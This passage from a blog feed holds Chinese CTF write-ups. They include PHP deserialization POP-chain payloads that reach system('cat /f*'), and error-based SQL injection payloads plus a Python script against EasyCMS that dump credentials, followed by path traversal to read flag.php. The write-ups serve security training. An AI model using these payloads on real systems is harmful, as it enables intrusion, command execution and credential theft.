class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A7&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">12</span><span class="operator">:</span><span class="string">&quot;Hello World!&quot;</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A6&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A8&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20211031213821.png" style="zoom:80%;">



<h2 id="pop2"><a href="#pop2" class="headerlink" title="pop2"></a>pop2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A1();</span><br><span class="line"><span class="variable">$b</span>= <span class="variable">$a</span> -&gt;tmp1= <span class="keyword">new</span> A3();</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>-&gt;tmp2=<span class="keyword">new</span> A4();</span><br><span class="line"><span class="variable">$d</span> =<span class="variable">$c</span>-&gt;tmp1=<span class="keyword">new</span> A6();</span><br><span class="line"><span class="variable">$e</span>=<span class="variable">$d</span>-&gt;tmp1=<span class="keyword">new</span> A8();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>


<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="operator">?</span><span class="variable">DASCTF</span><span class="operator">=</span><span class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A1&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A3&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A4&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A6&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A8&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20211031214026.png" style="zoom:80%;">







<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>接下去就是原生类的利用了</p>
<img src="http://img.npfs06.top/20211031214302.png" style="zoom:80%;">

<p>我们需要通过传参DAS和CTF，调用原生类</p>
<p><strong>可以进行文件操作的内置类：</strong></p>
<table>
<thead>
<tr>
<th align="left">类</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">DirectoryIterator</td>
<td align="left">遍历目录</td>
</tr>
<tr>
<td align="left">FilesystemIterator</td>
<td align="left">遍历目录</td>
</tr>
<tr>
<td align="left">GlobIterator</td>
<td align="left">遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
</tr>
<tr>
<td align="left">SplFileObject</td>
<td align="left">读取文件，按行读取（默认只读第一行），多行读取需要遍历</td>
</tr>
<tr>
<td align="left">finfo/finfo_open()</td>
<td align="left">需要两个参数 PHP扩展类</td>
</tr>
</tbody></table>
<p>首先通过内置类FilesystemIterator找到flag文件名</p>
<img src="http://img.npfs06.top/20211031214616.png" style="zoom:80%;">



<p>接下去就是要读取这个flag文件了，但是SplFileObject类只能读取第一行，通过测试发现文件中flag不在第一行，无法成功读取，比赛的时候就卡在这里了</p>
<p><strong>新知识：SplFileObject类搭配伪协议可以实现多行文件内容读取</strong></p>
<p>最终payload：</p>
<img src="http://img.npfs06.top/20211031214720.png" style="zoom:80%;">



<p>base64解密下就可以得到flag</p>
<img src="http://img.npfs06.top/20211031214837.png" style="zoom:80%;">







<hr>
<h1 id="第二道反序列化"><a href="#第二道反序列化" class="headerlink" title="第二道反序列化"></a>第二道反序列化</h1><p>复现地址 ：<a href="http://www.npfs06.top:32791/">http://www.npfs06.top:32791/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Test/&quot;</span>,get_class(<span class="keyword">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;no pop&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一题的链子比前一题简单，不过解题方法有两种</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">Test</span>::<span class="function"><span class="title">getFlag</span>()&lt;- <span class="variable">Fun</span>:<span class="title">__call</span>() &lt;- <span class="variable">A</span>:<span class="title">__get</span>() &lt;- <span class="variable">B</span>:<span class="title">__destruct</span>()</span></span><br></pre></td></tr></table></figure>
<p>入口为B类</p>
<img src="http://img.npfs06.top/20211031215858.png" style="zoom:80%;">

<p>最终调用点为Test类的getFlag方法</p>
<img src="http://img.npfs06.top/20211031215922.png" style="zoom:80%;">



<p>链子如下</p>
<img src="http://img.npfs06.top/20211031235300.png" style="zoom:80%;">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span> -&gt; a=<span class="keyword">new</span> A();</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span>-&gt; p = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$b</span> -&gt; a = <span class="keyword">new</span> Fun();</span><br><span class="line"><span class="comment">//$d -&gt; func = array(&quot;Test&quot;,&quot;getFlag&quot;);</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>


<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">Fun</span>:<span class="function"><span class="title">__call</span>() &lt;- <span class="variable">A</span>:<span class="title">__get</span>() &lt;- <span class="variable">B</span>:<span class="title">__destruct</span>()</span></span><br></pre></td></tr></table></figure>
<p>入口还是为B类，不过最终调用点为Fun类的<code>__call</code>方法</p>
<p>我们令B类的<code>B -&gt; a=new A()</code>,<code>B -&gt; p=&quot;cat /f*&quot;</code>,</p>
<img src="http://img.npfs06.top/20211031233259.png" style="zoom:80%;">



<p>这样<code>echo $this-&gt;a-&gt;$p;</code>就会调用A类，</p>
<img src="http://img.npfs06.top/20211031233356.png" style="zoom:80%;">

<p>A类的<code>return $this-&gt;a-&gt;$p();</code>,我们将<code>$this -&gt; a = new Fun()</code>,这里的$p就是我们在B类定义的p值，$p后面加上括号，会被识别为方法</p>
<img src="http://img.npfs06.top/20211031233550.png" style="zoom:80%;">

<blockquote>
<p><strong>__call: 当调用对象中不存在的方法会自动调用该方法。</strong></p>
</blockquote>
<p>因为Fun类中不存在$p方法,从而会调用Fun类中的<code>__call</code>方法</p>
<p><code>__call</code>方法中有<code>call_user_func</code>,并且参数可控，我们可以直接构造<code>system(&#39;cat /f*&#39;)</code>,</p>
<img src="http://img.npfs06.top/20211031221047.png" style="zoom:80%;">

<p>这里的$f变量不存在，并不影响system的执行</p>
<p>将Fun类的<code>$this-&gt;func = system </code>  从而直接实现命令执行</p>
<img src="http://img.npfs06.top/20211031234112.png" style="zoom:80%;">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span> -&gt; a=<span class="keyword">new</span> A();</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> -&gt; p=<span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$b</span> -&gt; a = <span class="keyword">new</span> Fun();</span><br><span class="line"><span class="comment">//$d-&gt;func=&quot;system&quot;</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>


<hr>
<p>因为存在私有类</p>
<img src="http://img.npfs06.top/20211031221333.png" style="zoom:80%;">

<p>我们需要进行urlencode编码</p>
<blockquote>
<p>PHP 序列化的时候 <strong>private</strong>和 <strong>protected</strong> 变量会引入不可见字符<code>%00</code>，<code>%00类名%00属性名</code> 为private，<code>%00*%00属性名</code> 为protected，注意这两个 <strong>%00</strong>就是 ascii 码为0 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚</p>
</blockquote>
<p>方法一的最终payload为：</p>
<img src="http://img.npfs06.top/20211031222218.png" style="zoom:80%;">

<p>注意下，图中框着的地方要修改为大于2的数值</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">22</span>B%<span class="number">22</span>%<span class="number">3</span>A<span class="number">3</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">22</span>p%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">3</span>%<span class="number">3</span>A%<span class="number">22111</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">22</span>a%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">22</span>A%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">22</span>a%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">3</span>%<span class="number">3</span>A%<span class="number">22</span>Fun%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">9</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Fun%<span class="number">00</span>func%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">2</span>%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A<span class="number">0</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">4</span>%<span class="number">3</span>A%<span class="number">22</span>Test%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>getFlag%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>


<p>方法二的最终payload为：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">22</span>B%<span class="number">22</span>%<span class="number">3</span>A<span class="number">3</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">22</span>p%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>cat+%<span class="number">2</span>Ff%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">22</span>a%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">22</span>A%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">22</span>a%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">3</span>%<span class="number">3</span>A%<span class="number">22</span>Fun%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">9</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Fun%<span class="number">00</span>func%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">6</span>%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>也是一样，将元素个数2修改为大于2的值</p>
<img src="http://img.npfs06.top/20211031222443.png" style="zoom:80%;">





<hr>
<p><strong>关于上面为什么要修改元素个数的解释</strong></p>
<p>最开始是以为修改元素是为了绕过fun类的 <code>__weakup</code>方法</p>
<img src="http://img.npfs06.top/20211031222813.png" style="zoom:80%;">





<p>但是最后发现，不论是否修改元素个数，最终还是会输出<code>Don&#39;t serialize me</code></p>
<p>整不明白了，可能是php版本问题，等官方wp出来再补充</p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>Algorithm Collection</title>
    <url>/2021/07/06/%E7%AE%97%E6%B3%95%E9%94%A6%E9%9B%86/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f32568b3b802fe4fe8da212c7ee3ccbc2b5859b7373ec5e8fca548cd14ce7f96"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>算法</category>
      </categories>
  </entry>
  <entry>
    <title>百度杯 YeSerCMS</title>
    <url>/2020/05/31/%E7%99%BE%E5%BA%A6%E6%9D%AF-YeSerCMS/</url>
    <content><![CDATA[<p>hint：新的CMS系统，帮忙测测是否有漏洞。<br>​           tips:flag在网站根目录下的flag.php中   <a id="more"></a></p>
<h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><p>内容管理系统（通常缩写为CMS）是帮助用户在网站上创建，管理和修改内容而无需专业技术知识的软件。内容管理系统作为一种工具，可以帮助构建网站，而无需从头开始编写所有代码</p>
<h2 id="常见判断网站cms方法"><a href="#常见判断网站cms方法" class="headerlink" title="常见判断网站cms方法"></a>常见判断网站cms方法</h2><blockquote>
<p>1   .robots.txt文件<br>2   .通过版权信息进行查询 (比如网站底部版权信息)<br>3  .通过查看网页源码的方式<br>4  .CMS扫描器<br>5  .cms指纹识别</p>
</blockquote>
<p>cms会存在漏洞，百度搜索本题的YeSerCMS没有结果，猜测改名了</p>
<p>在本题中通过逛网站<code>文档下载</code>一栏，随便点个文档进行下载，在网页底部的<code>我要评论</code>处可看到为<code>EasyCMS</code></p>
<blockquote>
<p>EasyCMS是一套使用PHP语言编写的、可扩展的轻量级开源内容管理系统（CMS）。<br>EasyCMS 1.5版本中的App/Modules/Admin/Tpl/default/Public/dwz/uploadify/scripts/uploadify.swf文件存在跨站脚本漏洞。远程攻击者可借助‘uploadifyID’或‘movieName’参数利用该漏洞注入任意的<br>Web脚本或HTML。</p>
</blockquote>
<p>百度搜下easycms的漏洞，本题可利用<a href="https://www.cnblogs.com/yangxiaodi/p/6963624.html" target="_blank">无限制报错注入</a>进行</p>
<p>爆数据库：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">url: /celive/live/header.php</span><br><span class="line">post：</span><br><span class="line"></span><br><span class="line">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((<span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">32</span>),<span class="number">0x5d</span>),<span class="number">1</span>)),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)-- &lt;/q&gt;&lt;/xjxquery&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>爆表：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((<span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">32</span>),<span class="number">0x5d</span>),<span class="number">1</span>)),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)-- &lt;/q&gt;&lt;/xjxquery&gt;</span><br></pre></td></tr></table></figure>
<p>这里可以看到返回的数据是<code>XPATH syntax error: &#39;[yesercms_a_attachment,yesercms_&#39;</code></p>
<p>很明显表没有全部列出来，这里可以修改参数<code>1</code>或者py脚本解决</p>
<p>py脚本如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">import</span> requests</span><br><span class="line"><span class="attribute">url</span>= &#x27;http://<span class="number">340</span>d<span class="number">45344</span>c<span class="number">5345</span>b<span class="number">7837232</span>f<span class="number">683</span>eac<span class="number">21005849</span>e<span class="number">95</span>f<span class="number">56547</span>e<span class="number">6</span>.changame.ichunqiu.com/celive/live/header.php&#x27;</span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">1</span>,<span class="number">999</span>,<span class="number">31</span>):     #这里的意思是从<span class="number">1</span>开始，隔<span class="number">31</span>各后再取，即i的第二个值为<span class="number">32</span>，至于这里为什么是<span class="number">32</span>，从Post和响应数据可以看出来</span><br><span class="line">    <span class="attribute">postdata</span> = &#123;&#x27;xajax&#x27;: &#x27;Postdata&#x27;, &#x27;xajaxargs[<span class="number">0</span>]&#x27;: <span class="string">&quot;&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()),%s,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;&quot;</span> %str(i)&#125;</span><br><span class="line">    <span class="attribute">r</span> = requests.post(url,data=postdata)</span><br><span class="line">    <span class="attribute">print</span>(r.content[<span class="number">22</span>:<span class="number">53</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有个yesercms_user表，尝试从这个表爆字段：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((<span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(concat(username,<span class="string">&#x27;|&#x27;</span>,<span class="keyword">password</span>)) <span class="keyword">from</span> yesercms_user),<span class="number">1</span>,<span class="number">32</span>),<span class="number">0x5d</span>),<span class="number">1</span>)),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)-- &lt;/q&gt;&lt;/xjxquery&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到[admin|ff512d4240cbbdeafada40467</p>
<p>猜测密码为MD5加密，但是位数不够，将1，32 改为 33，64</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((<span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(concat(username,<span class="string">&#x27;|&#x27;</span>,<span class="keyword">password</span>)) <span class="keyword">from</span> yesercms_user),<span class="number">33</span>,<span class="number">64</span>),<span class="number">0x5d</span>),<span class="number">1</span>)),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)-- &lt;/q&gt;&lt;/xjxquery&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到ccbe61</p>
<p>拼接md5解密得Yeser231</p>
<p>因此账号为admin,密码为Yeser231</p>
<p>然后下一步就是重点了，怎么得到flag.php中的内容</p>
<p>我们可以进入模板一栏的当前模板编辑，对服务器文件进行编辑</p>
<p>因此使用burpsuite抓编辑的包，尝试修改id参数来读取flag.php，这里不清楚flag.php在几级目录可以依次尝试flag.php,../flag.php,../../flag.php，在../../flag.php时成功拿到flag</p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>红明谷杯数据安全大赛web wp</title>
    <url>/2021/04/07/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb-wp/</url>
    <content><![CDATA[<p>红明谷杯数据安全大赛web write up<a id="more"></a></p>
